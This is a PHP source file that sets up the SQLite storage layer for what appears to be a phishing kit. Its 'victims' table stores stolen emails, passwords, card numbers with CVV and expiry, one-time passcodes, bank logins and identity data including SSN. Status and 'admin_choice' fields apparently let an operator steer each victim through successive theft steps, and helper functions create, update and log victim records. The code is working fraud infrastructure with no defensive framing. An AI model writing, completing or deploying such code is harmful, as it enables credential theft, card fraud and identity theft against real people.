<?php
require_once 'config.php';

$db = new SQLite3('victims.db');

// Create victims table
$db->exec("
    CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT UNIQUE,
        ip TEXT,
        user_agent TEXT,
        country TEXT,
        email TEXT,
        password TEXT,
        cc_num TEXT,
        cc_name TEXT,
        cc_expiry TEXT,
        cc_cvv TEXT,
        cc_zip TEXT,
        otp TEXT,
        otp2 TEXT,
        approval_code TEXT,
        bank_user TEXT,
        bank_pass TEXT,
        kyc_name TEXT,
        kyc_dob TEXT,
        kyc_address TEXT,
        kyc_city TEXT,
        kyc_phone TEXT,
        kyc_ssn TEXT,
        status TEXT DEFAULT 'login',
        next_step TEXT DEFAULT 'cc',
        admin_choice TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
");

// Create logs table
$db->exec("
    CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT,
        action TEXT,
        data TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
");

function getVictim($session_id) {
    global $db;
    $stmt = $db->prepare("SELECT * FROM victims WHERE session_id = :sid");
    $stmt->bindValue(':sid', $session_id, SQLITE3_TEXT);
    $result = $stmt->execute();
    return $result->fetchArray(SQLITE3_ASSOC);
}

function createVictim($session_id, $ip, $ua) {
    global $db;
    $stmt = $db->prepare("INSERT OR IGNORE INTO victims (session_id, ip, user_agent) VALUES (:sid, :ip, :ua)");
    $stmt->bindValue(':sid', $session_id, SQLITE3_TEXT);
    $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
    $stmt->bindValue(':ua', $ua, SQLITE3_TEXT);
    $stmt->execute();
}

function updateVictim($session_id, $fields) {
    global $db;
    $sets = [];
    foreach ($fields as $k => $v) {
        $sets[] = "$k = :$k";
    }
    $sql = "UPDATE victims SET " . implode(', ', $sets) . ", updated_at = datetime('now') WHERE session_id = :sid";
    $stmt = $db->prepare($sql);
    foreach ($fields as $k => $v) {
        $stmt->bindValue(":$k", $v, SQLITE3_TEXT);
    }
    $stmt->bindValue(':sid', $session_id, SQLITE3_TEXT);
    $stmt->execute();
}

function logAction($session_id, $action, $data) {
    global $db;
    $stmt = $db->prepare("INSERT INTO logs (session_id, action, data) VALUES (:sid, :act, :data)");
    $stmt->bindValue(':sid', $session_id, SQLITE3_TEXT);
    $stmt->bindValue(':act', $action, SQLITE3_TEXT);
    $stmt->bindValue(':data', json_encode($data), SQLITE3_TEXT);
    $stmt->execute();
}
?>
